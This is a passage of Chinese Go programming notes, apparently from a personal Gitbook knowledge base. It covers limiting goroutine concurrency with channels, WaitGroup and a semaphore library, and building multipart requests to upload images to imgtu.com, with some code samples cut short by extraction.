所有结果都显示出来了，也就是说所有子协程都执行完了，但是没有控制并发数量 尝试chan+sync√ 从上面2个可以看出，一个可以控制并发数量，另一个可以让所有子协程都执行完，所以结合一下，就能达到我们的目的了 package main import ( \"fmt\" \"math\" \"sync\" \"time\" ) var wg = sync.WaitGroup{} func out(i int, semaphone chan bool){ fmt.Printf(\"go func: %d\\n\", i) time.Sleep(time.Second) // 释放通道 结合一下，确实能达到我们想到的效果了！！！就是结果有点乱，一般来说不影响了 go func: 1 go func: 0 go func: 3 go func: 2 go func: 4 go func: 5 go func: 6 go func: 7 go func: 8 go func: 9 信号量Semaphore 和Python中的信号量一样，感觉是结合了chan+sync，确实是一个很好的方案，输出的结果也是按顺序输出的 https://github.com/EDDYCJY/gsema package main import ( \"fmt\" \"github.com/EDDYCJY/gsema\" \"math\" \"time\" ) var semaphore = gsema.NewSemaphore(2) func out(i int){ fmt.Printf(\"go func: %d\\n\", i) time.Sleep(time.Second) defer semaphore.Done() } func main() { userCount := math.MaxInt8 for i := 0; i go func: 0 go func: 1 go func: 2 go func: 3 go func: 4 go func: 5 go func: 6 go func: 7 go func: 8 go func: 9 协程池 这个就是一次性创建所有的协程，然后再根据大小来调用 https://github.com/panjf2000/ants https://github.com/Jeffail/tunny 参考 来，控制一下 Goroutine 的并发数量 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:14:57 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/02.GO实例/05.限制GO并发数.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/02.GO实例/06.使用GO上传图片.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/06.使用GO上传图片.html","title":"06.使用GO上传图片","keywords":"","body":" 前言 基础版 进阶版 完整版 前言 需要批量上传图片到图床，之前用python写脚本倒是很简单，不过GO因为并发太强大了，所以这次用GO来试试 基础版 构建一个上传图片的请求，主要代码在imgkr()函数中 package main import ( \"bytes\" \"fmt\" \"golang.org/x/net/publicsuffix\" \"io\" \"math/rand\" \"mime/multipart\" \"net/http\" \"net/http/cookiejar\" \"os\" \"path/filepath\" ) var client http.Client func imgkr() { // 要上传的文件 imgFilePath := \"/Users/d4m1ts/d4m1ts/Upload/logo.png\" file, _ := os.Open(imgFilePath) defer file.Close() // 设置body数据并写入缓冲区 bodyBuff := bytes.NewBufferString(\"\") //bodyBuff := &bytes.Buffer{} bodyWriter := multipart.NewWriter(bodyBuff) _ = bodyWriter.SetBoundary(fmt.Sprintf(\"-----------------------------%d\", rand.Int())) // 加入图片二进制 part, _ := bodyWriter.CreateFormFile(\"source\", filepath.Base(file.Name())) _, _ = io.Copy(part, file) // 其他字段 _ = bodyWriter.WriteField(\"a\", \"b\") // 自动补充boundary结尾 bodyWriter.Close() fmt.Println(bodyBuff) //构建的完整数据包，没有header // 组合创建数据包 req, _ := http.NewRequest(\"POST\", \"http://127.0.0.1:8000\", bodyBuff) req.ContentLength = int64(bodyBuff.Len()) req.Header.Set(\"Content-Type\", bodyWriter.FormDataContentType()) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") client.Do(req) } func main() { jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client = http.Client{Jar: jar} imgkr() } 接收到的数据包 进阶版 上面的数据包大概是没什么问题，但是图片的Content-Type是application/octet-stream，而一般情况下图片的应该是形如image/png 分析了一下原因，是因为CreateFormFile函数里面硬编码了 看里面的一些函数，也没找到直接设置这个地方的Content-Type的，所以我决定根据他的规则重新写一下。 分析这个函数，前面h是header头，也是我们要修改的地方，后面是调用*Writer.CreatePart，我们也模拟这个行为就可以了 所以微调一下代码（直接给代码复制粘贴过来改就可以了，也可以直接重写CreateFormFile函数，后者稍微麻烦一点点） 效果 目标达成，完整代码 package main import ( \"bytes\" \"fmt\" \"golang.org/x/net/publicsuffix\" \"io\" \"math/rand\" \"mime/multipart\" \"net/http\" \"net/http/cookiejar\" \"net/textproto\" \"os\" \"path/filepath\" \"strings\" ) var client http.Client var quoteEscaper = strings.NewReplacer(\"\\\\\", \"\\\\\\\\\", `\"`, \"\\\\\\\"\") func escapeQuotes(s string) string { return quoteEscaper.Replace(s) } func imgkr() { // 要上传的文件 imgFilePath := \"/Users/d4m1ts/d4m1ts/Upload/logo.png\" file, _ := os.Open(imgFilePath) defer file.Close() // 设置body数据并写入缓冲区 bodyBuff := bytes.NewBufferString(\"\") //bodyBuff := &bytes.Buffer{} bodyWriter := multipart.NewWriter(bodyBuff) _ = bodyWriter.SetBoundary(fmt.Sprintf(\"-----------------------------%d\", rand.Int())) // 加入图片二进制 h := make(textproto.MIMEHeader) h.Set(\"Content-Disposition\", fmt.Sprintf(`form-data; name=\"%s\"; filename=\"%s\"`, escapeQuotes(\"source\"), escapeQuotes(filepath.Base(file.Name())))) h.Set(\"Content-Type\", \"image/png\") part, _ := bodyWriter.CreatePart(h) _, _ = io.Copy(part, file) // 其他字段 _ = bodyWriter.WriteField(\"a\", \"b\") // 自动补充boundary结尾 bodyWriter.Close() fmt.Println(bodyBuff) //构建的完整数据包，没有header // 组合创建数据包 req, _ := http.NewRequest(\"POST\", \"http://127.0.0.1:8000\", bodyBuff) req.ContentLength = int64(bodyBuff.Len()) req.Header.Set(\"Content-Type\", bodyWriter.FormDataContentType()) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") client.Do(req) } func main() { jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client = http.Client{Jar: jar} imgkr() } 完整版 写了一个上传到https://imgtu.com/的，大家有需可以参考 为了方便以后的复制粘贴，给构造上传图片请求单独写到imgkr()函数中的，不然应该给结果解析也写里面的 package main import ( \"bytes\" \"fmt\" \"golang.org/x/net/publicsuffix\" \"io\" \"io/ioutil\" \"math/rand\" \"mime/multipart\" \"net/http\" \"net/http/cookiejar\" \"net/textproto\" \"os\" \"path/filepath\" \"regexp\" \"strings\" \"time\" \"github.com/json-iterator/go\" ) var client http.Client var quoteEscaper = strings.NewReplacer(\"\\\\\", \"\\\\\\\\\", `\"`, \"\\\\\\\"\") func escapeQuotes(s string) string { return quoteEscaper.Replace(s) } /* 获取上传图片需要的token */ func getToken() string { u := \"https://imgtu.com/\" req, _ := http.NewRequest(\"GET\", u, nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") resp, _ := client.Do(req) res,_ := ioutil.ReadAll(resp.Body) regex, _ := regexp.Compile(\"PF.obj.config.auth_token = \\\"(.*?)\\\";\") if regex.MatchString(string(res)){ token := regex.FindStringSubmatch(string(res))[1] return token } return \"\" } /* 构造上传请求 */ func imgkr(token string, imgFilePath string) *http.Request { // 上传网址 target := \"https://imgtu.com/json\" // 要上传的文件 file, _ := os.Open(imgFilePath) defer file.Close() // 设置body数据并写入缓冲区 bodyBuff := bytes.NewBufferString(\"\") //bodyBuff := &bytes.Buffer{} bodyWriter := multipart.NewWriter(bodyBuff) _ = bodyWriter.SetBoundary(fmt.Sprintf(\"-----------------------------%d\", rand.Int())) // 加入图片二进制 h := make(textproto.MIMEHeader) h.Set(\"Content-Disposition\", fmt.Sprintf(`form-data; name=\"%s\"; filename=\"%s\"`, escapeQuotes(\"source\"), escapeQuotes(filepath.Base(file.Name())))) h.Set(\"Content-Type\", \"image/png\") part, _ := bodyWriter.CreatePart(h) _, _ = io.Copy(part, file) // 其他字段 _ = bodyWriter.WriteField(\"type\", \"file\") _ = bodyWriter.WriteField(\"action\", \"upload\") _ = bodyWriter.WriteField(\"timestamp\", fmt.Sprintf(\"%d\", time.Now().UnixNano()/1e6)) _ = bodyWriter.WriteField(\"auth_token\", token) _ = bodyWriter.WriteField(\"nsfw\", \"0\") // 自动补充boundary结尾 _ = bodyWriter.Close() //fmt.Println(bodyBuff) //构建的完整数据包，没有header // 创建请求 req, _ := http.NewRequest(\"POST\", target, bodyBuff) req.ContentLength = int64(bodyBuff.Len()) req.Header.Set(\"Content-Type\", bodyWriter.FormDataContentType()) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") return req } func main() { jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client = http.Client{Jar: jar} token := getToken() req := imgkr(token, \"/Users/d4m1ts/d4m1ts/Upload/logo.png\") resp, _ := client.Do(req) res, _ := ioutil.ReadAll(resp.Body) imageUrl := jsoniter.Get(res, \"image\").Get(\"url\") fmt.Println(imageUrl.ToString()) } 效果 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:14:49 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/02.GO实例/06.使用GO上传图片.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "}}